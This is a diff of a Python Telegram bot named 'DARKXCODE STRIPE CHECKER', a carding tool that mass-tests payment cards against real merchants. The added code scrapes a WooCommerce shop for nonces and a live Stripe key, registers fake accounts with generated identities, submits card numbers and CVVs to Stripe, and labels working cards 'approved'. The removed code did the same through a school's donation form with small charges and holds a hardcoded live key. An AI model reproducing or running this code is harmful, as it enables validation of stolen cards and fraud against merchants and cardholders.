@@ -9,6 +9,9 @@ import re
 import sys
 import aiohttp
 import string
+import uuid
+from bs4 import BeautifulSoup
+from mimesis import Generic as Gen
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
 from telegram.constants import ParseMode
@@ -126,10 +129,10 @@ BOT_TOKEN = os.getenv("BOT_TOKEN", "")
 ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "").split(",")]
 CHANNEL_LINK = os.getenv("CHANNEL_LINK", "")
 
-DOMAIN = os.getenv("DOMAIN", "https://texassouthernacademy.com")
+DOMAIN = "jogoka.com"  # Updated to new gateway
 PK = os.getenv(
     "STRIPE_PK",
-    "pk_live_51LTAH3KQqBJAM2n1ywv46dJsjQWht8ckfcm7d15RiE8eIpXWXUvfshCKKsDCyFZG48CY68L9dUTB0UsbDQe32Zn700Qe4vrX0d"
+    ""  # Not used in new checker but kept for compatibility
 )
 
 # Bot info
@@ -137,13 +140,13 @@ BOT_INFO = {
     "name":
     "⚡ DARKXCODE STRIPE CHECKER ⚡",
     "version":
-    "1.0",
+    "2.0",  # Updated version
     "creator":
-    "@ISHANT_OFFICIAL",  # Updated from combined.py
+    "@ISHANT_OFFICIAL",
     "gates":
-    "Stripe",
+    "Stripe (jogoka.com)",  # Updated gateway name
     "features":
-    "• Fast Single Check\n• Mass Checks\n• Real-time Statistics\n• Invite & Earn System"
+    "• Fast Single Check\n• Mass Checks\n• Real-time Statistics\n• Invite & Earn System\n• NEW: jogoka.com Gateway"
 }
 
 # In-memory cache for checking tasks (temporary storage)
@@ -390,137 +393,6 @@ def get_bin_info(bin_number):
         logger.error(f"BIN API error: {e}")
 
     return {"bank": "Unknown", "country": "Unknown", "country_flag": "🏳️"}
-
-
-async def init_database():
-    """Initialize database connection with retry mechanism"""
-    global db_pool
-    max_retries = 3
-    retry_delay = 5
-
-    for attempt in range(max_retries):
-        try:
-            logger.info(
-                f"Attempting database connection (Attempt {attempt + 1}/{max_retries})..."
-            )
-
-            # Try to connect with SSL mode 'require' for Supabase
-            try:
-                db_pool = await asyncpg.create_pool(
-                    DATABASE_URL,
-                    **DB_CONNECTION_PARAMS,
-                    ssl='require'  # Supabase requires SSL
-                )
-            except Exception as ssl_error:
-                logger.warning(
-                    f"SSL connection failed, trying without SSL: {ssl_error}")
-                # Try without SSL if SSL fails
-                db_pool = await asyncpg.create_pool(DATABASE_URL,
-                                                    **DB_CONNECTION_PARAMS,
-                                                    ssl=False)
-
-            # Test connection
-            async with db_pool.acquire() as conn:
-                # Simple test query
-                result = await conn.fetchval('SELECT 1')
-                if result == 1:
-                    logger.info(
-                        "Database connection established and tested successfully"
-                    )
-                else:
-                    raise Exception("Database test query failed")
-
-            # Create tables if they don't exist
-            await create_tables()
-            logger.info("Database tables created/verified")
-            return True
-
-        except asyncpg.InvalidPasswordError:
-            logger.error(
-                "❌ Invalid database password. Please check your credentials.")
-            return False
-        except asyncpg.ConnectionDoesNotExistError:
-            logger.error(
-                "❌ Database connection failed. Host may be unreachable.")
-        except asyncpg.PostgresError as e:
-            logger.error(f"❌ Database error: {e}")
-        except Exception as e:
-            logger.error(f"❌ Database initialization error: {str(e)}")
-
-        if attempt < max_retries - 1:
-            logger.info(f"Retrying in {retry_delay} seconds...")
-            await asyncio.sleep(retry_delay)
-
-    logger.error("Failed to connect to database after multiple attempts")
-    return False
-
-
-async def create_tables():
-    """Create database tables"""
-    async with db_pool.acquire() as conn:
-        # Users table
-        await conn.execute('''
-            CREATE TABLE IF NOT EXISTS users (
-                user_id BIGINT PRIMARY KEY,
-                username TEXT,
-                first_name TEXT,
-                joined_date TIMESTAMP DEFAULT NOW(),
-                last_active TIMESTAMP DEFAULT NOW(),
-                credits INTEGER DEFAULT 0,
-                credits_spent INTEGER DEFAULT 0,
-                total_checks INTEGER DEFAULT 0,
-                approved_cards INTEGER DEFAULT 0,
-                declined_cards INTEGER DEFAULT 0,
-                checks_today INTEGER DEFAULT 0,
-                last_check_date DATE,
-                joined_channel BOOLEAN DEFAULT FALSE,
-                referrer_id BIGINT,
-                referrals_count INTEGER DEFAULT 0,
-                earned_from_referrals INTEGER DEFAULT 0
-            )
-        ''')
-
-        # Gift codes table
-        await conn.execute('''
-            CREATE TABLE IF NOT EXISTS gift_codes (
-                code TEXT PRIMARY KEY,
-                credits INTEGER NOT NULL,
-                max_uses INTEGER,
-                uses INTEGER DEFAULT 0,
-                created_at TIMESTAMP DEFAULT NOW(),
-                created_by BIGINT,
-                claimed_by TEXT[] DEFAULT '{}'
-            )
-        ''')
-
-        # Claimed codes table
-        await conn.execute('''
-            CREATE TABLE IF NOT EXISTS user_claimed_codes (
-                user_id BIGINT,
-                code TEXT,
-                claimed_at TIMESTAMP DEFAULT NOW(),
-                PRIMARY KEY (user_id, code)
-            )
-        ''')
-
-        # Bot statistics table
-        await conn.execute('''
-            CREATE TABLE IF NOT EXISTS bot_statistics (
-                id SERIAL PRIMARY KEY,
-                total_checks INTEGER DEFAULT 0,
-                total_approved INTEGER DEFAULT 0,
-                total_declined INTEGER DEFAULT 0,
-                total_credits_used INTEGER DEFAULT 0,
-                total_users INTEGER DEFAULT 0,
-                start_time TIMESTAMP DEFAULT NOW()
-            )
-        ''')
-
-        # Initialize bot statistics
-        await conn.execute('''
-            INSERT INTO bot_statistics (id) VALUES (1)
-            ON CONFLICT (id) DO NOTHING
-        ''')
 
 
 # In-memory storage as fallback
@@ -1062,6 +934,288 @@ async def update_gift_code_usage(code, user_id):
     return True
 
 
+# ==================== NEW CHECKER ENGINE ====================
+
+async def magneto_check(number: str) -> bool:
+    """Luhn validation check"""
+    digits = ''.join(ch for ch in number if ch.isdigit())
+    if not digits:
+        return False
+    total = 0
+    reverse = digits[::-1]
+    for i, ch in enumerate(reverse):
+        n = int(ch)
+        if i % 2 == 1:
+            n *= 2
+            if n > 9:
+                n -= 9
+        total += n
+    return total % 10 == 0
+
+def generate_random_time():
+    """Generate random timestamp"""
+    return int(time.time()) - random.randint(100, 1000)
+
+def uu_again_service():
+    """Generate fake user information"""
+    Fakeuserinformation = Gen('en')
+    CheckGM = ['gmail.com', 'hotmail.com', 'yahoo.com', 'live.com', 'paypal.com', 'outlook.com']
+    
+    first = Fakeuserinformation.person.first_name().lower()
+    num = random.randint(100, 9999)
+    
+    return {
+        "email": f"{first}{num}@{random.choice(CheckGM)}",
+        "country": Fakeuserinformation.address.country(),
+        "city": Fakeuserinformation.address.city(),
+        "ug": Fakeuserinformation.internet.user_agent(),
+        "fullnm": Fakeuserinformation.person.full_name(),
+        "lastname": Fakeuserinformation.person.last_name().lower(),
+        "firstname": Fakeuserinformation.person.first_name().lower()
+    }
+
+async def new_gateway_check(cc, mm, yy, cvv):
+    """NEW WORKING CHECKER - Replaces Tele_sync"""
+    try:
+        # Parse year
+        if len(yy) == 4 and yy.startswith('20'):
+            yy = yy[2:]
+        
+        # Validate card locally first
+        if not magneto_check(cc):
+            return cc, "declined", "❌ Invalid card number", 0
+        
+        # Generate user info
+        user = uu_again_service()
+        
+        # Create session
+        async with aiohttp.ClientSession() as session:
+            # Step 1: Get account page
+            page_one = "https://jogoka.com/my-account/"
+            h1 = {
+                'User-Agent': user["ug"],
+                'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
+            }
+            
+            async with session.get(page_one, headers=h1) as r1:
+                if r1.status != 200:
+                    return cc, "declined", f"❌ Page Error {r1.status}", r1.status
+                
+                r1_text = await r1.text()
+                soup = BeautifulSoup(r1_text, "html.parser")
+                tok = soup.find("input", {"name": "woocommerce-register-nonce"})
+                token = tok["value"] if tok else None
+                
+                if not token:
+                    return cc, "declined", "❌ Registration token not found", 0
+            
+            # Step 2: Register account
+            ime = generate_random_time()
+            p1 = {
+                'email': user['email'],
+                'wc_order_attribution_source_type': "typein",
+                'wc_order_attribution_referrer': "(none)",
+                'wc_order_attribution_utm_campaign': "(none)",
+                'wc_order_attribution_utm_source': "(direct)",
+                'wc_order_attribution_utm_medium': "(none)",
+                'wc_order_attribution_utm_content': "(none)",
+                'wc_order_attribution_utm_id': "(none)",
+                'wc_order_attribution_utm_term': "(none)",
+                'wc_order_attribution_utm_source_platform': "(none)",
+                'wc_order_attribution_utm_creative_format': "(none)",
+                'wc_order_attribution_utm_marketing_tactic': "(none)",
+                'wc_order_attribution_session_entry': f"https://jogoka.com/my-account/",
+                'wc_order_attribution_session_start_time': ime,
+                'wc_order_attribution_session_pages': "1",
+                'wc_order_attribution_session_count': "1",
+                'wc_order_attribution_user_agent': user["ug"],
+                'woocommerce-register-nonce': token,
+                '_wp_http_referer': "/my-account/",
+                'register': "Register"
+            }
+            
+            async with session.post(page_one, data=p1, headers=h1) as r2:
+                if r2.status not in [200, 302]:
+                    return cc, "declined", f"❌ Registration failed {r2.status}", r2.status
+            
+            # Get session cookies
+            cookies_str = "; ".join([f"{c.key}={c.value}" for c in session.cookie_jar])
+            
+            # Step 3: Get payment page
+            page_payment = "https://jogoka.com/my-account/add-payment-method/"
+            h2 = {
+                'User-Agent': user["ug"],
+                'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                'referer': "https://jogoka.com/my-account/payment-methods/",
+                'Cookie': cookies_str
+            }
+            
+            async with session.get(page_payment, headers=h2) as r3:
+                if r3.status != 200:
+                    return cc, "declined", f"❌ Payment page error {r3.status}", r3.status
+                
+                r3_text = await r3.text()
+                
+                # Extract Stripe keys
+                mu = re.search(r'pk_live_[A-Za-z0-9]+', r3_text)
+                add_match = re.search(r'"session_id"\s*:\s*"(.*?)"', r3_text)
+                add_mach = re.search(r'"accountId"\s*:\s*"(.*?)"', r3_text)
+                add_non = re.search(r'"createSetupIntentNonce"\s*:\s*"(.*?)"', r3_text)
+                
+                if not all([mu, add_match, add_mach, add_non]):
+                    return cc, "declined", "❌ Stripe keys not found", 0
+                
+                akey = mu.group(0)
+                adde = add_match.group(1)
+                acid = add_mach.group(1)
+                non = add_non.group(1)
+            
+            # Step 4: Create payment method
+            page_method = "https://api.stripe.com/v1/payment_methods"
+            
+            payload = {
+                'billing_details[name]': user['firstname'],
+                'billing_details[email]': user['email'],
+                'billing_details[address][country]': 'US',
+                'billing_details[address][postal_code]': "10080",
+                'type': "card",
+                'card[number]': cc,
+                'card[cvc]': cvv,
+                'card[exp_year]': yy,
+                'card[exp_month]': mm,
+                'allow_redisplay': "unspecified",
+                'payment_user_agent': "stripe.js/83a1f53796; stripe-js-v3/83a1f53796; payment-element; deferred-intent",
+                'referrer': "https://jogoka.com",
+                'time_on_page': ime,
+                'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
+                'client_attribution_metadata[merchant_integration_source]': "elements",
+                'client_attribution_metadata[merchant_integration_subtype]': "payment-element",
+                'client_attribution_metadata[merchant_integration_version]': "2021",
+                'client_attribution_metadata[payment_intent_creation_flow]': "deferred",
+                'client_attribution_metadata[payment_method_selection_flow]': "merchant_specified",
+                'client_attribution_metadata[elements_session_config_id]': str(uuid.uuid4()),
+                'client_attribution_metadata[merchant_integration_additional_elements][0]': "payment",
+                'guid': str(uuid.uuid4()),
+                'muid': str(uuid.uuid4()),
+                'sid': str(uuid.uuid4()),
+                'key': akey,
+                '_stripe_account': acid
+            }
+            
+            ses_headers = {
+                'User-Agent': user["ug"],
+                'Accept': "application/json",
+                'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
+                'sec-ch-ua-mobile': "?0",
+                'sec-ch-ua-platform': "\"Linux\"",
+                'origin': "https://js.stripe.com",
+                'sec-fetch-site': "same-site",
+                'sec-fetch-mode': "cors",
+                'sec-fetch-dest': "empty",
+                'referer': "https://js.stripe.com/"
+            }
+            
+            async with session.post(page_method, data=payload, headers=ses_headers) as r4:
+                if r4.status != 200:
+                    return cc, "declined", f"❌ Stripe API error {r4.status}", r4.status
+                
+                r4data = await r4.json()
+                
+                if 'error' in r4data:
+                    error_msg = r4data['error'].get('message', 'Stripe error')
+                    # Check for specific decline messages
+                    if any(x in error_msg.lower() for x in ['card', 'declined', 'insufficient', 'invalid', 'incorrect', 'expired']):
+                        return cc, "declined", f"❌ {error_msg[:30]}", 0
+                    else:
+                        return cc, "declined", f"❌ Stripe: {error_msg[:30]}", 0
+                
+                identify = r4data.get('id')
+                if not identify:
+                    return cc, "declined", "❌ No payment method ID", 0
+            
+            # Step 5: Create setup intent
+            page_complete = "https://jogoka.com/wp-admin/admin-ajax.php"
+            payload2 = {
+                'action': 'create_setup_intent',
+                'wcpay-payment-method': identify,
+                '_ajax_nonce': non
+            }
+            
+            h4 = {
+                'User-Agent': user["ug"],
+                'sec-fetch-site': "same-origin",
+                'sec-fetch-mode': "cors",
+                'sec-fetch-dest': "empty",
+                'referer': "https://jogoka.com/my-account/add-payment-method/",
+                'Cookie': cookies_str
+            }
+            
+            async with session.post(page_complete, data=payload2, headers=h4) as r5:
+                if r5.status != 200:
+                    return cc, "declined", f"❌ AJAX error {r5.status}", r5.status
+                
+                r5data = await r5.json()
+                
+                # Parse response
+                msg = r5data.get('data', {}).get('error', {}).get('message')
+                msg = str(msg) if msg else ""
+                
+                success_flag = r5data.get("success") == True
+                status_flag = r5data.get("data", {}).get("status") == "succeeded"
+                
+                if not msg and r5data.get("success"):
+                    msg = "Payment method successfully added"
+                elif not msg:
+                    msg = "Declined"
+                
+                # Determine result
+                if success_flag and status_flag:
+                    return cc, "approved", f"✅ Charged | {msg}", 200
+                elif "insufficient funds" in msg.lower():
+                    return cc, "declined", "❌ Insufficient Funds", 0
+                elif "security code is incorrect" in msg.lower():
+                    return cc, "declined", "❌ Incorrect CVV", 0
+                elif "card not supported" in msg.lower():
+                    return cc, "declined", "❌ Card not supported", 0
+                else:
+                    return cc, "declined", f"❌ {msg[:30]}", 0
+    
+    except asyncio.TimeoutError:
+        return cc, "declined", "❌ Timeout error", 0
+    except aiohttp.ClientError as e:
+        return cc, "declined", f"❌ Network error: {str(e)[:20]}", 0
+    except Exception as e:
+        logger.error(f"Error in new_gateway_check: {e}")
+        return cc, "declined", f"❌ Checker error: {str(e)[:20]}", 0
+
+# ==================== REPLACED CHECK FUNCTIONS ====================
+
+async def check_single_card_fast(card):
+    """Replace with new checker - Single card check"""
+    try:
+        cc, mon, year, cvv = card.split("|")
+        year = year[-2:] if len(year) == 4 else year
+        cc_clean = cc.replace(" ", "")
+        
+        # Use new checker
+        result_card, status, message, http_code = await new_gateway_check(cc_clean, mon, year, cvv)
+        
+        # Map results to existing format
+        if status == "approved":
+            return result_card, "approved", "✅ Charged", 200
+        elif "insufficient funds" in message.lower():
+            return result_card, "declined", "❌ Insufficient Funds", 0
+        elif "card not supported" in message.lower():
+            return result_card, "declined", "❌ Card not supported", 0
+        elif "incorrect cvv" in message.lower():
+            return result_card, "declined", "❌ Incorrect CVV", 0
+        else:
+            return result_card, "declined", "❌ Declined", 0
+            
+    except Exception as e:
+        logger.error(f"Error in check_single_card_fast: {e}")
+        return card, "declined", f"❌ Error: {str(e)[:20]}", 0
+
 # ==================== CALLBACK HANDLERS ====================
 
 
@@ -1080,309 +1234,6 @@ async def back_to_start_callback(update: Update,
                          message=query.message,
                          callback_query=query)
     await start_command(fake_update, context)
-
-
-async def check_single_card_fast(card):
-    """Working card checker from combined.py (Tele function)"""
-    try:
-        cc, mon, year, cvv = card.split("|")
-        year = year[-2:] if len(year) == 4 else year
-        cc_clean = cc.replace(" ", "")
-
-        # Use requests (synchronous) since combined.py uses it
-        # We'll run it in a thread to avoid blocking
-        loop = asyncio.get_event_loop()
-        result = await loop.run_in_executor(None, Tele_sync, card)
-
-        # Map results like in combined.py
-        if "Donation Successful!" in result:
-            return card, "approved", "✅ Charged", 200
-        elif "Your card does not support this type of purchase" in result:
-            return card, "declined", "❌ Card not supported", 0
-        elif "security code is incorrect" in result or "security code is invalid" in result:
-            return card, "declined", "❌ Incorrect CVV", 0
-        elif "insufficient funds" in result:
-            return card, "declined", "❌ Insufficient Funds", 0
-        else:
-            return card, "declined", "❌ Declined", 0
-
-    except Exception as e:
-        logger.error(f"Error in check_single_card_fast: {e}")
-        return card, "declined", f"❌ Error: {str(e)[:20]}", 0
-
-
-def Tele_sync(card):
-    """Synchronous version of Tele function from combined.py"""
-    try:
-        ccx = card.strip()
-        n = ccx.split("|")[0]
-        mm = ccx.split("|")[1]
-        yy = ccx.split("|")[2]
-        cvc = ccx.split("|")[3]
-
-        if "20" in yy:
-            yy = yy.split("20")[1]
-
-        # Generate random amounts like in combined.py
-        random_amount1 = random.randint(1, 4)
-        random_amount2 = random.randint(1, 99)
-
-        headers = {
-            'authority':
-            'api.stripe.com',
-            'accept':
-            'application/json',
-            'accept-language':
-            'en-US,en;q=0.9',
-            'content-type':
-            'application/x-www-form-urlencoded',
-            'origin':
-            'https://js.stripe.com',
-            'referer':
-            'https://js.stripe.com/',
-            'sec-ch-ua':
-            '"Chromium";v="139", "Not;A=Brand";v="99"',
-            'sec-ch-ua-mobile':
-            '?1',
-            'sec-ch-ua-platform':
-            '"Android"',
-            'sec-fetch-dest':
-            'empty',
-            'sec-fetch-mode':
-            'cors',
-            'sec-fetch-site':
-            'same-site',
-            'user-agent':
-            'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-        }
-
-        data = f'type=card&billing_details[name]=Waiyan&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Ff4aa9d6f0f%3B+stripe-js-v3%2Ff4aa9d6f0f%3B+card-element&key={PK}'
-
-        response = requests.post('https://api.stripe.com/v1/payment_methods',
-                                 headers=headers,
-                                 data=data,
-                                 timeout=10)
-
-        if response.status_code != 200:
-            return f"Stripe Error {response.status_code}"
-
-        pm_data = response.json()
-        if 'error' in pm_data:
-            return f"Stripe: {pm_data['error'].get('message', 'Error')}"
-
-        pmid = pm_data.get('id')
-        if not pmid:
-            return "No payment method ID"
-
-        # Get billing address
-        billing_address = get_billing_address(n[:6])
-
-        headers = {
-            'authority': 'texassouthernacademy.com',
-            'accept': 'application/json, text/javascript, */*; q=0.01',
-            'accept-language': 'en-US,en;q=0.9',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'origin': 'https://texassouthernacademy.com',
-            'referer': 'https://texassouthernacademy.com/donation/',
-            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent':
-            'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-            'x-requested-with': 'XMLHttpRequest',
-        }
-
-        data = {
-            'action':
-            'wp_full_stripe_inline_donation_charge',
-            'wpfs-form-name':
-            'donate',
-            'wpfs-form-get-parameters':
-            '%7B%7D',
-            'wpfs-custom-amount':
-            'other',
-            'wpfs-custom-amount-unique':
-            '0.50',
-            'wpfs-donation-frequency':
-            'one-time',
-            'wpfs-billing-name':
-            billing_address['name'],
-            'wpfs-billing-address-country':
-            billing_address['country'],
-            'wpfs-billing-address-line-1':
-            billing_address.get('address_line_1', '7246 Royal Ln'),
-            'wpfs-billing-address-line-2':
-            '',
-            'wpfs-billing-address-city':
-            billing_address['city'],
-            'wpfs-billing-address-state':
-            '',
-            'wpfs-billing-address-state-select':
-            billing_address['state'],
-            'wpfs-billing-address-zip':
-            billing_address['postal_code'],
-            'wpfs-card-holder-email':
-            f'{billing_address["name"].replace(" ", "")}{random_amount1}{random_amount2}@gmail.com',
-            'wpfs-card-holder-name':
-            billing_address['name'],
-            'wpfs-stripe-payment-method-id':
-            f'{pmid}',
-        }
-
-        response = requests.post(
-            'https://texassouthernacademy.com/wp-admin/admin-ajax.php',
-            headers=headers,
-            data=data,
-            timeout=10)
-
-        if response.status_code != 200:
-            return f"AJAX Error {response.status_code}"
-
-        result_data = response.json()
-        return result_data.get('message', 'Declined')
-
-    except Exception as e:
-        return f"Error: {str(e)[:50]}"
-
-
-def Tele_sync(card):
-    """Synchronous version of Tele function from combined.py"""
-    try:
-        ccx = card.strip()
-        n = ccx.split("|")[0]
-        mm = ccx.split("|")[1]
-        yy = ccx.split("|")[2]
-        cvc = ccx.split("|")[3]
-
-        if "20" in yy:
-            yy = yy.split("20")[1]
-
-        # Generate random amounts like in combined.py
-        random_amount1 = random.randint(1, 4)
-        random_amount2 = random.randint(1, 99)
-
-        headers = {
-            'authority':
-            'api.stripe.com',
-            'accept':
-            'application/json',
-            'accept-language':
-            'en-US,en;q=0.9',
-            'content-type':
-            'application/x-www-form-urlencoded',
-            'origin':
-            'https://js.stripe.com',
-            'referer':
-            'https://js.stripe.com/',
-            'sec-ch-ua':
-            '"Chromium";v="139", "Not;A=Brand";v="99"',
-            'sec-ch-ua-mobile':
-            '?1',
-            'sec-ch-ua-platform':
-            '"Android"',
-            'sec-fetch-dest':
-            'empty',
-            'sec-fetch-mode':
-            'cors',
-            'sec-fetch-site':
-            'same-site',
-            'user-agent':
-            'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-        }
-
-        data = f'type=card&billing_details[name]=Waiyan&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Ff4aa9d6f0f%3B+stripe-js-v3%2Ff4aa9d6f0f%3B+card-element&key={PK}'
-
-        response = requests.post('https://api.stripe.com/v1/payment_methods',
-                                 headers=headers,
-                                 data=data,
-                                 timeout=10)
-
-        if response.status_code != 200:
-            return f"Stripe Error {response.status_code}"
-
-        pm_data = response.json()
-        if 'error' in pm_data:
-            return f"Stripe: {pm_data['error'].get('message', 'Error')}"
-
-        pmid = pm_data.get('id')
-        if not pmid:
-            return "No payment method ID"
-
-        # Get billing address
-        billing_address = get_billing_address(n[:6])
-
-        headers = {
-            'authority': 'texassouthernacademy.com',
-            'accept': 'application/json, text/javascript, */*; q=0.01',
-            'accept-language': 'en-US,en;q=0.9',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'origin': 'https://texassouthernacademy.com',
-            'referer': 'https://texassouthernacademy.com/donation/',
-            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent':
-            'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-            'x-requested-with': 'XMLHttpRequest',
-        }
-
-        data = {
-            'action':
-            'wp_full_stripe_inline_donation_charge',
-            'wpfs-form-name':
-            'donate',
-            'wpfs-form-get-parameters':
-            '%7B%7D',
-            'wpfs-custom-amount':
-            'other',
-            'wpfs-custom-amount-unique':
-            '0.50',
-            'wpfs-donation-frequency':
-            'one-time',
-            'wpfs-billing-name':
-            billing_address['name'],
-            'wpfs-billing-address-country':
-            billing_address['country'],
-            'wpfs-billing-address-line-1':
-            billing_address.get('address_line_1', '7246 Royal Ln'),
-            'wpfs-billing-address-line-2':
-            '',
-            'wpfs-billing-address-city':
-            billing_address['city'],
-            'wpfs-billing-address-state':
-            '',
-            'wpfs-billing-address-state-select':
-            billing_address['state'],
-            'wpfs-billing-address-zip':
-            billing_address['postal_code'],
-            'wpfs-card-holder-email':
-            f'{billing_address["name"].replace(" ", "")}{random_amount1}{random_amount2}@gmail.com',
-            'wpfs-card-holder-name':
-            billing_address['name'],
-            'wpfs-stripe-payment-method-id':
-            f'{pmid}',
-        }
-
-        response = requests.post(
-            'https://texassouthernacademy.com/wp-admin/admin-ajax.php',
-            headers=headers,
-            data=data,
-            timeout=10)
-
-        if response.status_code != 200:
-            return f"AJAX Error {response.status_code}"
-
-        result_data = response.json()
-        return result_data.get('message', 'Declined')
-
-    except Exception as e:
-        return f"Error: {str(e)[:50]}"
 
 
 async def quick_check_callback(update: Update,
@@ -1701,426 +1552,6 @@ def get_next_email():
 
 # Initialize email list
 generate_email_list(100)
-
-# Global session for reuse
-checker_session = None
-last_session_time = 0
-
-
-async def get_or_create_session():
-    """Get existing session or create new one"""
-    global checker_session, last_session_time
-
-    current_time = time.time()
-
-    # Reuse session for up to 5 minutes
-    if checker_session and not checker_session.closed and current_time - last_session_time < 300:
-        return checker_session
-
-    # Create new session
-    if checker_session and not checker_session.closed:
-        await checker_session.close()
-
-    connector = aiohttp.TCPConnector(ssl=False)
-    timeout = aiohttp.ClientTimeout(total=15)
-    checker_session = aiohttp.ClientSession(connector=connector,
-                                            timeout=timeout)
-    last_session_time = current_time
-
-    return checker_session
-
-
-async def check_single_card_ultrafast(card):
-    """ULTRA-FAST card checker with session reuse"""
-    try:
-        cc, mon, year, cvv = card.split("|")
-        year = year[-2:] if len(year) == 4 else year
-        cc_clean = cc.replace(" ", "")
-
-        # Get session
-        session = await get_or_create_session()
-
-        # Get billing address
-        billing_address = get_billing_address(cc_clean[:6])
-
-        # Step 1: Get checkout page ONCE and reuse
-        checkout_nonce = None
-        checkout_page = None
-
-        # Try to get existing checkout page data
-        if hasattr(check_single_card_ultrafast, 'checkout_data'):
-            checkout_nonce = check_single_card_ultrafast.checkout_data.get(
-                'nonce')
-            checkout_page = check_single_card_ultrafast.checkout_data.get(
-                'html')
-
-        if not checkout_nonce or not checkout_page:
-            headers = {
-                "accept":
-                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-                "user-agent": random.choice(USER_AGENTS),
-                "cache-control": "no-cache",
-                "pragma": "no-cache"
-            }
-
-            async with session.get(f"{DOMAIN}/donation/",
-                                   headers=headers,
-                                   timeout=10) as response:
-                if response.status != 200:
-                    return card, "declined", f"❌ Page Error {response.status}", response.status
-
-                checkout_page = await response.text()
-
-                # Extract nonce from page
-                nonce_pattern = r'wp_full_stripe_inline_donation_charge_nonce["\']?\s*:\s*["\']([^"\']+)["\']'
-                match = re.search(nonce_pattern, checkout_page)
-                if match:
-                    checkout_nonce = match.group(1)
-                else:
-                    # Try alternative pattern
-                    checkout_nonce = parseX(
-                        checkout_page,
-                        '"wp_full_stripe_inline_donation_charge_nonce":"', '"')
-
-                if checkout_nonce:
-                    # Cache checkout data
-                    check_single_card_ultrafast.checkout_data = {
-                        'nonce': checkout_nonce,
-                        'html': checkout_page,
-                        'timestamp': time.time()
-                    }
-                else:
-                    return card, "declined", "❌ No checkout nonce", 0
-
-        # Step 2: Create payment method with Stripe
-        headers1 = {
-            "accept": "application/json",
-            "content-type": "application/x-www-form-urlencoded",
-            "origin": "https://js.stripe.com",
-            "referer": "https://js.stripe.com/",
-            "user-agent": random.choice(USER_AGENTS),
-        }
-
-        data1 = {
-            "type": "card",
-            "billing_details[name]": billing_address["name"],
-            "card[number]": cc_clean,
-            "card[cvc]": cvv,
-            "card[exp_month]": mon,
-            "card[exp_year]": year,
-            "guid": "NA",
-            "muid": "NA",
-            "sid": "NA",
-            "payment_user_agent":
-            "stripe.js%2Ff4aa9d6f0f%3B+stripe-js-v3%2Ff4aa9d6f0f%3B+card-element",
-            "key": PK,
-        }
-
-        async with session.post("https://api.stripe.com/v1/payment_methods",
-                                headers=headers1,
-                                data=data1,
-                                timeout=5) as response:
-            if response.status == 200:
-                req1 = await response.text()
-            else:
-                # Clear cached checkout data on error
-                if hasattr(check_single_card_ultrafast, 'checkout_data'):
-                    delattr(check_single_card_ultrafast, 'checkout_data')
-                return card, "declined", f"❌ Stripe Error {response.status}", response.status
-
-        try:
-            pm_data = json.loads(req1)
-            if 'error' in pm_data:
-                error_msg = pm_data['error'].get('message', 'Stripe error')
-                error_type = pm_data['error'].get('type', '')
-
-                # Check if it's an actual card decline
-                is_card_error = any(
-                    x in error_type.lower()
-                    for x in ['card_error', 'invalid_request_error'])
-                is_decline = any(x in error_msg.lower() for x in [
-                    'card', 'declined', 'insufficient', 'invalid', 'incorrect',
-                    'expired'
-                ])
-
-                if is_card_error or is_decline:
-                    return card, "declined", f"❌ {error_msg[:30]}", pm_data[
-                        'error'].get('code', 0)
-                else:
-                    return card, "declined", f"❌ Error: {error_msg[:30]}", pm_data[
-                        'error'].get('code', 0)
-
-            pmid = pm_data.get('id')
-            if not pmid:
-                return card, "declined", "❌ No Payment ID", 0
-        except json.JSONDecodeError:
-            return card, "declined", "❌ Invalid Response", 0
-
-        # Step 3: Process donation with pre-generated email
-        headers2 = {
-            "accept": "application/json, text/javascript, */*; q=0.01",
-            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "origin": DOMAIN,
-            "referer": f"{DOMAIN}/donation/",
-            "user-agent": random.choice(USER_AGENTS),
-            "x-requested-with": "XMLHttpRequest",
-        }
-
-        # Use pre-generated email
-        email = get_next_email()
-
-        data2 = {
-            "action":
-            "wp_full_stripe_inline_donation_charge",
-            "wpfs-form-name":
-            "donate",
-            "wpfs-form-get-parameters":
-            "%7B%7D",
-            "wpfs-custom-amount":
-            "other",
-            "wpfs-custom-amount-unique":
-            "0.50",
-            "wpfs-donation-frequency":
-            "one-time",
-            "wpfs-billing-name":
